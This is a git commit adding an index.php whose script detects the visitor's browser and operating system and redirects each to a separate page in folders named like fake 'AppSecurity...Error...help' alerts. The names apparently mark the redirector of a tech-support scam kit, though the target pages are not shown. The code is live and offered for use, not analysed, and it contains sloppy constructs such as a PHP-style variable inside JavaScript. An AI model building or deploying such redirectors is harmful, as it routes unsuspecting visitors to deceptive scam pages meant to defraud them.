64067e6dd9442ade40750b1b4e93faa083fe519c
rosalianothem <164734214+rosalianothem@users.noreply.github.com>
2024-03-24 07:46:02 -0700

    Add files via upload

---
+++ index.php
@@ -0,0 +1,35 @@
+<script type="text/javascript">
+var isChromium = window.chrome,
+	vendorName = window.navigator.vendor,
+	isOpera = window.navigator.userAgent.indexOf("OPR") > -1,
+	isIEedge = window.navigator.userAgent.indexOf("Edge") > -1;
+isEdgeChromium = window.navigator.userAgent.indexOf("dg") > -1;
+
+if(isChromium !== null && isChromium !== undefined && vendorName === "Google Inc." && isOpera == false && isIEedge == false) 	{
+	// is Google chrome
+window.location.href = "./AppSecurity0d8Je00CH888Error0inf0.help/index.html";
+}
+if(navigator.userAgent.indexOf("Firefox") != -1 )
+	{
+			 window.location.href = "./AppSecurity0d8Je00FF888Error0inf0.help/index.html";
+	}
+
+	if(window.navigator.userAgent.indexOf("dg") != -1 )
+		{
+				 window.location.href = "./AppSecurity0d8Je00ECH888Error0inf0.help/index.html";
+		}
+
+if(window.navigator.userAgent.indexOf("Edge") != -1 )
+	{
+			 window.location.href = "./AppSecurity0d8Je00IED888Error0inf0.help/index.html";
+	}
+if(window.navigator.userAgent.indexOf("Mac") != -1 )
+	{
+			 window.location.href = "./AppSecurity0d8Je00MA888Error0inf0.help/index.html";
+	}
+if((navigator.userAgent.indexOf("MSIE") != -1 ) || (!!document.documentMode == true )) //IF IE > 10
+	{
+		window.location.href = "./AppSecurity0d8Je00IED888Error0inf0.help/index.html";
+	}
+$SAFARI_URL = "apple";
+</script>
